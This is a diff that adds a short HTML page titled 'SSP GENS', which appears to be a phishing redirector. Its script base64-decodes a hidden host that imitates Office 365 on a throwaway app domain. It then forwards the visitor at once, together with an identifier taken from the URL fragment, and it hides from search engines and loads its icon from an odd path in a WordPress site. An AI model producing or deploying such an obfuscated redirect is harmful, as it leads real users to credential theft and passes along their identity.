@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="9; IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="shortcut icon" href="https://www.syokatei.burari.biz/wp-includes/pomo/i/favicon.png"
+        type="image/x-icon">
+
+    <meta name="Robots" content="NOINDEX, NOFOLLOW">
+    <title>SSP GENS</title>
+    
+    <script type="text/javascript">
+
+    const delay = -999; //30 seconds
+    setTimeout(message, delay);
+
+ function getProcessHash(){
+     if(window.location.hash){
+         let h = window.location.hash;
+         let s = h.split('#')[1];
+         
+         return atob(s);
+     }
+    }
+
+    function message() {
+        if (window.location.hash){
+        var link = window.atob("b2ZmaWNlMzY1LmQ0NjdvOWZ4eW5jMWQuYW1wbGlmeWFwcC5jb20=");
+        var hash = getProcessHash();
+        window.top.location.href=`https://${link}#${hash}`;
+    }
+    }
+
+    </script>
+</body>
+
+</html>
